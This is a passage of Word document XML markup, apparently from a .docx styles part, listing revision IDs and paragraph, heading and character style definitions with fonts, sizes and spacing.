    <w:rsid w:val="00F92A2B"/>
    <w:rsid w:val="00F92FD1"/>
    <w:rsid w:val="00F93E0F"/>
    <w:rsid w:val="00F9693B"/>
    <w:rsid w:val="00FA0C07"/>
    <w:rsid w:val="00FA6536"/>
    <w:rsid w:val="00FB0DC7"/>
    <w:rsid w:val="00FB1361"/>
    <w:rsid w:val="00FB37B2"/>
    <w:rsid w:val="00FB5096"/>
    <w:rsid w:val="00FB6942"/>
    <w:rsid w:val="00FB6DD6"/>
    <w:rsid w:val="00FB7CAC"/>
    <w:rsid w:val="00FC6347"/>
    <w:rsid w:val="00FD0B45"/>
    <w:rsid w:val="00FD42CB"/>
    <w:rsid w:val="00FD651B"/>
    <w:rsid w:val="00FD6F46"/>
    <w:rsid w:val="00FE35BA"/>
    <w:rsid w:val="00FE4904"/>
    <w:rsid w:val="00FE6B75"/>
    <w:rsid w:val="00FE7B00"/>
    <w:rsid w:val="00FF2981"/>
    <w:rsid w:val="00FF5652"/>
    <w:rsid w:val="00FF62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171112-A484-9142-A160-5C660C29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AE"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00BA2B90"/>
    <w:pPr>
      <w:keepNext/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00BA2B90"/>
    <w:pPr>
      <w:keepNext/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000045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BA2B90"/>
    <w:pPr>
      <w:keepNext/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="26"/>
      <w:szCs w:val="34"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00090D7C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="3600"/>
      </w:tabs>
      <w:suppressAutoHyphens w:val="0"/>
      <w:spacing w:before="240" w:after="60"/>
      <w:ind w:left="3600" w:hanging="720"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading6Char"/>
    <w:qFormat/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="5"/>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading7">
    <w:name w:val="heading 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00D323AE"/>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qFormat/>
    <w:rsid w:val="00BA2B90"/>
    <w:pPr>
      <w:spacing w:before="240" w:after="60"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading9Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="000045F6"/>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007FBC"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="x-none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar1"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00007FBC"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="x-none" w:eastAsia="x-none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="0027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7E0E86"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent">
    <w:name w:val="Body Text Indent"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="007E0E86"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="360"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="007E0E86"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00761A3B"/>
    <w:pPr>
      <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar1">
    <w:name w:val="Footer Char1"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="009739FA"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="009B43B8"/>
    <w:rPr>
      <w:b/>
      <w:sz w:val="26"/>
      <w:szCs w:val="34"/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText3">
    <w:name w:val="Body Text 3"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="000045F6"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="000045F6"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="WW-NormalWeb">
    <w:name w:val="WW-Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="000045F6"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:spacing w:before="280" w:after="280"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Lucida Sans Unicode" w:cs="Tahoma"/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Absatz-Standardschriftart">
    <w:name w:val="Absatz-Standardschriftart"/>
    <w:rsid w:val="00D323AE"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num7z0">
    <w:name w:val="WW8Num7z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num7z1">
    <w:name w:val="WW8Num7z1"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num7z2">
    <w:name w:val="WW8Num7z2"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num9z0">
    <w:name w:val="WW8Num9z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num9z1">
    <w:name w:val="WW8Num9z1"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num9z2">
    <w:name w:val="WW8Num9z2"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num10z0">
    <w:name w:val="WW8Num10z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num10z1">
    <w:name w:val="WW8Num10z1"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num10z3">
    <w:name w:val="WW8Num10z3"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z0">
    <w:name w:val="WW8Num13z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z0">
    <w:name w:val="WW8Num14z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:eastAsia="Times New Roman" w:hAnsi="Symbol" w:cs="Arial"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z1">
    <w:name w:val="WW8Num14z1"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z2">
    <w:name w:val="WW8Num14z2"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z3">
    <w:name w:val="WW8Num14z3"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z0">
    <w:name w:val="WW8Num20z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num23z0">
    <w:name w:val="WW8Num23z0"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextChar">
    <w:name w:val="Body Text Char"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:kern w:val="1"/>
      <w:position w:val="12"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ib1">
    <w:name w:val="ib1"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:spacing w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextIndent2Char">
    <w:name w:val="Body Text Indent 2 Char"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyText2Char">
    <w:name w:val="Body Text 2 Char"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Heading">
    <w:name w:val="Heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyText"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:before="240" w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Liberation Sans" w:eastAsia="DejaVu Sans" w:hAnsi="Liberation Sans" w:cs="DejaVu Sans"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List">
    <w:name w:val="List"/>
    <w:basedOn w:val="BodyText"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:kern w:val="1"/>
      <w:position w:val="12"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:suppressLineNumbers/>
      <w:spacing w:before="120" w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index">
    <w:name w:val="Index"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:suppressLineNumbers/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="WW-Default">
    <w:name w:val="WW-Default"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:autoSpaceDE w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Century Gothic" w:eastAsia="Arial" w:hAnsi="Century Gothic" w:cs="Century Gothic"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent2">
    <w:name w:val="Body Text Indent 2"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="480" w:lineRule="auto"/>
      <w:ind w:left="360"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText2">
    <w:name w:val="Body Text 2"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="480" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Framecontents">
    <w:name w:val="Frame contents"/>
    <w:basedOn w:val="BodyText"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:kern w:val="1"/>
      <w:position w:val="12"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableContents">
    <w:name w:val="Table Contents"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:suppressLineNumbers/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableHeading">
    <w:name w:val="Table Heading"/>
    <w:basedOn w:val="TableContents"/>
    <w:rsid w:val="00D323AE"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D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sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLTypewriter">
    <w:name w:val="HTML Typewriter"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLVariable">
    <w:name w:val="HTML Variable"/>
    <w:rsid w:val="00D323AE"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      <w:i w:val="0"/>
      <w:iCs w:val="0"/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NormalBold">
    <w:name w:val="Normal+Bold"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="NormalBoldChar"/>
    <w:rsid w:val="00AB1AE2"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="1500"/>
      </w:tabs>
      <w:suppressAutoHyphens w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NormalBoldChar">
    <w:name w:val="Normal+Bold Char"/>
    <w:link w:val="NormalBold"/>
    <w:rsid w:val="00AB1AE2"/>
    <w:rPr>
      <w:b/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="005D18A4"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="PlainText">
    <w:name w:val="Plain Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="PlainTextChar"/>
    <w:rsid w:val="00ED01D5"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="x-none"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PlainTextChar">
    <w:name w:val="Plain Text Char"/>
    <w:link w:val="PlainText"/>
    <w:rsid w:val="00ED01D5"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:lang w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="apple-converted-space">
    <w:name w:val="apple-converted-space"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00631606"/>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00A11ED6"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00090D7C"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
      <w:lang w:val="en-US" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00090D7C"/>
    <w:rPr>
      <w:sz w:val="40"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading6"/>
    <w:rsid w:val="00090D7C"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00090D7C"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00090D7C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00964394"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BalloonTextChar">
    <w:name w:val="Balloon Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BalloonText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00964394"/>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8407">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="303051346">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
